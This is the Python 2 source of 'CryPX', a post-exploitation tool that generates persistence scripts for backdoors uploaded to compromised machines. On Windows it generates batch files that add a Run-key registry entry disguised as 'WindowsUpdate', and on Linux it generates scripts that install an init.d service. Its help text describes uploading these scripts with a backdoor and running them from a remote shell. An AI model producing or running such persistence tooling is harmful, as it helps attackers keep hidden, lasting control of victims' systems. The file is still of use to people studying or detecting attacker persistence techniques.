#!/usr/bin/python
import sys
import os
import time
import commands
import signal
import os.path
import base64
import subprocess
import random
import signal
from termcolor import colored

#Root Checker
if os.getuid() == 0:
    pass
else:
    print colored("[x] This program requires root privilegies!",'red')
    sys.exit('Exiting..')
#SIGINT CTRL+C HANDLER
def sigint_handler(signal_number, stack_frame):
	os.system('clear')
	randomcolor = ["white", "magenta", "blue"]
	print colored('[!] Generating: Extraordinary_Rage_Quit_v1.337..','red')
	print colored('k3!2n3l_p4n1c uN!235p0n51v3 p!20c3550!2 !!!\nThis CPU did not acknowledge interrupts TLB state:0x0',random.choice(randomcolor))
	print colored('''RAX: 0x00000000ffffffff, RBX: 0x0000000000002710, RCX: 0x0000000000007000, RDX: 0xffffff81880d5078''','red')
	print colored('''RSP: 0xffffff818ff7bc1c, RBP: 0xffffff818ff7bc20, RSI: 0x0000000000007000, RDI: 0xffffff81697b6004''','yellow')
	print colored('''R8:  0xffffff8188055078, R9:  0xffffff802fc7de00, R10: 0xffffff802fcbdc21, R11: 0xffffff802fc7de01''','green')
	print colored('''R12: 0x0000000000000000, R13: 0x0000000000000003, R14: 0x0000000000000065, R15: 0xffffff81697b6004''','cyan')
	print colored('''RFL: 0x0000000000000292, RIP: 0xffffff7fb058fe52, CS:  0x0000000000000008, SS:  0x0000000000000000''','magenta')
	sys.exit(-1)

signal.signal(signal.SIGINT, sigint_handler)

#Banner    
os.system('clear')
time.sleep(1)
print colored("""
*********************************************
*********************************************
********************************************* 
********************************************* 
*********************************************	
*********************************************


""","yellow")
time.sleep(0.3)
os.system('clear')

print colored("""
***@************$*******#***********@*******$
****$******@*********%******#********$%******
******$*******%********%********************* 
******#*********#************%**********#**** 
***********$*********#***************@*******	
******@*********%************%*********$*****


""","green")
time.sleep(0.3)
os.system('clear')

print colored("""
___*_____                _____@_______*  ___
\#   ___ @_$____* ___.__.\___#*_ $ \   \/  $
/    \  \/\_  _#$<   |  | |     ___/*     # 
#     \____#  | \/\__%  | #    $    /     ! 
 \$____#  /|__|   / _*__% |__*_|   #___*#  \	
	\/	  \/		  	 \_/


""","blue")
time.sleep(0.3)
os.system('clear')

print colored("""
___*_____                _____@_______*  ___
\#   ___ ______* ___.__.\___#*_ $ \   \/  $
   \  #$<   |  |$%# |     ___/*     # 
#     \____#  | | #    $    /     ! 
 \__#@_     #  /|__|   / _*__% |__*_|   #___*#  \	
	\/	  \/		  	 \_/


""","green")
time.sleep(0.3)
os.system('clear')
print colored("""
_________                ______________  ___
\_   ___ \_______ ___.__.\______   \   \/  /
/    \  \/\_  __ <   |  | |     ___/\     / 
\     \____|  | \/\___  | |    |    /     \ 
 \______  /|__|   / ____| |____|   /___/\  \	
	\/	  \/		  	 \_/   	v0.3 beta


""","red")

def banner():
	print colored("""
_________                ______________  ___
\_   ___ \_______ ___.__.\______   \   \/  /
/    \  \/\_  __ <   |  | |     ___/\     / 
\     \____|  | \/\___  | |    |    /     \ 
 \______  /|__|   / ____| |____|   /___/\  \	
	\/	  \/		  	 \_/   	v0.3 beta


""","red")
	return

cwd = os.getcwd()
time.sleep(2)
while True:
	print colored('''
 [1] Windows	[3] Raspberry Pi /COMING SOON/
 [2] Linux	[4] Android /COMING SOON/
 [h] Help	[q] quit''','magenta')
	oschoice = raw_input('Select OS: ')
	if oschoice == 'h' or oschoice == 'H':
		print colored("""
 * CryPX v0.3 beta *
 | 
 | CryPX is a small penetration testing / post exploitation
 | tool, designed for creating a persistence scripts
 | for programs such as backdoors.
 | 
 | CryPX can generate scripts for:
 |  - Microsoft Windows
 |  - Linux
 |  - Raspberry Pi
 |  - Android
 |
 | USAGE:
 |
 | CryPX is a post exploitation tool and it's scripts
 | are meant to be uploaded to the target remotely alongside
 | with an executable backdoor.
 |
 | CryPX provides an user-friendly interaction
 | for generating a lightweight persistence scripts
 | for multiple operating systems.
 |
 | After generating a script, upload a program/backdoor
 | alongside with the generated script iteslf to a target machine
 | and simply execute the script from a remote shell.
 | 
 | ***
 | Please note that CryPX will NOT help you gain remote
 | access to any machine itself, CryPX is meant to be used
 | after you gain an access to your target.
 |
 | CryPX is completely useless without a host program.
 | It is only used to make the host program run persistently.
 | 
 |
 | CryPX is currently in a beta stage and will be updated in future.
 | Currently only preview features are available.
 |
 | ***
 | CryPX can only be used for educational purposes.
 | Developer of this software is NOT responsible for any damage
 | done by this software, as it may only be used in educational processes
 | or with a permission from an owner of the target machine.
 |
 | KNGHX 2017
 |
 | DONATE: 1C5Ru4kqE8M5hutmwusyYFGcdFshv5888g
 |_________________________		
		
		""",'yellow')
	if oschoice == '3':
		print colored('This feature is currently locked and will be available soon.','red')
		continue
	if oschoice == '4':
		print colored('This feature is currently locked and will be available soon.','red')
		continue
	if oschoice == 'q' or oschoice == 'Q':
		print colored('Thank you for using CryPX! Now exiting..','red')
		sys.exit()
	if oschoice == '1' or oschoice == 'Windows' or oschoice == 'WINDOWS' or oschoice == 'windows' or oschoice == 'win':
		print colored('OS => WINDOWS','yellow')
		while True:
			print colored('''[1] Registry 
[2] Service */COMING SOON/*
[3] Startup Folder */COMING SOON/*
[4] Registry [GOD-MODE] */COMING SOON/*
[5] Help
[6] Back''','cyan')
			winmethod = raw_input('Select method: ')
			if winmethod == '2':
				print colored('This feature is currently locked and will be available soon.','red')
				continue
			if winmethod == '3':
				print colored('This feature is currently locked and will be available soon.','red')
				continue
			if winmethod == '4':
				print colored('This feature is currently locked and will be available soon.','red')
				continue
			if winmethod == '6':
				break
			if winmethod == '5':
				print colored('''
 * Registry 
 |----------------------
 | Writes host file as a REG_SZ value to the registry to automatically run it
 | after startup.
 | Registry path is HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 |______________________
 * Service /COMING SOON/
 |----------------------
 | Creates a Windows Service with an automatic activation
 | to make the host file run at every startup with an authority.
 |______________________
 * Startup Folder /COMING SOON/
 |----------------------
 | Moves the host file to the Windows Startup folder
 | *MAY NOT WORK ON LATEST WINDOWS VERSIONS, BEST USED ON OLD VERSIONS*
 |______________________
 * Registry [GOD-MODE] /COMING SOON/
 | Rewrites Windows registry to add the host file to the 'Shell' value
 | to be ran automatically alongside with the Windows Explorer. 
 |______________________
''','yellow')
			if winmethod == '1' or winmethod == 'reg' or winmethod == 'registry':
				print colored('METHOD => Registry','yellow')
				winfilename = raw_input('Output file name: ')
				if winfilename == '':
					winfilename = 'default'
				print colored('FILENAME => %s'% winfilename,'green')
				while True:
					hostfile = raw_input('Host File Name: ')
					if hostfile == '':
						continue
					else:
						break
				print colored('HOSTFILE => %s'% hostfile,'green')
				regvalue = raw_input('Registry Entry Name [Default = WidowsUpdate]: ')
				if regvalue == '':
					regvalue = 'WindowsUpdate'
				print colored('ENTRY NAME => %s'% regvalue ,'green')
				regdata = raw_input('Host file path [Default = C:\ProgramData\]: ')
				if regdata == '':
					regdata = commands.getoutput("echo 'C:\ProgramData'")
				print colored('HOSTFILE_PATH => %s'% regdata,'green')
				hidefile = raw_input('Stealth Mode [y/N]: ')
				while True:
					if hidefile == 'y' or hidefile == 'Y':
						print colored('STEALTH_MODE => TRUE ','green')
						break
					if hidefile ==	'n' or hidefile == 'N':
						print colored('STEALTH_MODE => FALSE','green')
						break
					if hidefile == '':
						print colored('STEALTH_MODE => FALSE','green')
						hidefile = 'y'
						break
					else:
						continue
				while True:
					culm = raw_input('Write Location [HKLM/HKCU] \n *USE HKEY_CURRENT_USER [HKCU] if you do NOT have system authority \n{Default = HKCU}*: ')
					if culm == '':
						culm = 'HKCU'
						break
					if culm == 'HKLM' or culm == 'hklm':
						print colored('WRITE_TO => HKLM','green')
						break
					if culm == 'hkcu' or culm == 'HKCU':
						print colored('WRITE_TO => HKCU','green')
					else:
						continue			
				time.sleep(1)
				os.system('clear')
				time.sleep(0.5)
				print colored('[!] Generating output file..','yellow')
				os.system('touch %s/%s.bat'% (cwd, winfilename))
				with open("%s.bat"% winfilename, "w") as text_file:
					text_file.write("""reg add %s\Software\Microsoft\Windows\CurrentVersion\Run /v %s /d %s\%s /t REG_SZ /f
move %s C:\ProgramData
exit
"""% (culm, regvalue, regdata, hostfile, hostfile))
				print colored('OUTPUT FILE: %s/%s.bat'% (cwd, winfilename),'red')
				banner()
				break
			if winmethod == '2':
				print colored('SOON','red')
			if winmethod == '3':
				print colored('SOON','red')
			if winmethod == '4':
				print colored('SOON','red')
	if oschoice == '2':
		print colored('OS => Linux','yellow')
		while True:
			print colored('''
 [1] init.d
 [2] autostart */COMING SOON/*
 [3] .bashrc */COMING SOON/*
 [4] Help
 [5] Back''','cyan')
			linuxmethod = raw_input('Select method: ')
			if linuxmethod == '5':
				break
			if linuxmethod == '4':
				print colored("""
 * init.d
 |----------------------
 | Creates and enables an init script in /etc/init.d
 | which starts the host file automatically after system startup.
 |______________________
 * autostart /COMING SOON/
 |----------------------
 | Creates a script in /root/.config/autostart which runs the host file
 | automatically after system startup *USEFUL FOR OLDER VERSIONS OF LINUX*
 |______________________
 * .bashrc /COMING SOON/
 | Writes execution commands to .bashrc file
 | making the host file run automatically after system startup. 
 |______________________
""",'yellow')
			if linuxmethod == '1':
				print colored('METHOD => init.d','green')
				servicename = raw_input('Service/File name: ')
				if servicename == '':
					servicename = 'default'
				print colored('SERVICE_NAME => %s'% servicename,'green')
				hostfile = raw_input('Host file name: ')
				print colored('HOSTFILE => %s'% hostfile,'green')
				time.sleep(1)
				os.system('clear')
				time.sleep(0.5)
				print colored('[!] Generating output file','yellow')
				os.system('touch %s/%s.sh'% (cwd, servicename))
				with open("%s.sh"% servicename, "w") as text_file:
					text_file.write("""#!/bin/bash
touch /etc/init.d/%s
chmod ugo+x /etc/init.d/%s
echo "#!/bin/bash" >> /etc/init.d/%s
echo ".%s/%s" >> /etc/init.d/%s
chmod ugo+x %s/%s
systemctl enable %s
update-rc.d %s defaults
"""% (servicename, servicename, servicename, cwd, hostfile, servicename, cwd, hostfile, servicename, servicename))
				os.system('chmod +x %.sh'% servicename)
				print colored('OUTPUT FILE: %s/%s.sh'% (cwd, servicename),'red')
				banner()
				break
			if linuxmethod == '2':
				print colored('METHOD => .config/autostart','green')
				print colored('This feature is currently locked and will be available soon.','red')
				continue
			if linuxmethod == '3':
				print colored('METHOD => .bashrc','green')
				print colored('This feature is currently locked and will be available soon.','red')	
				continue
### I'll be back..
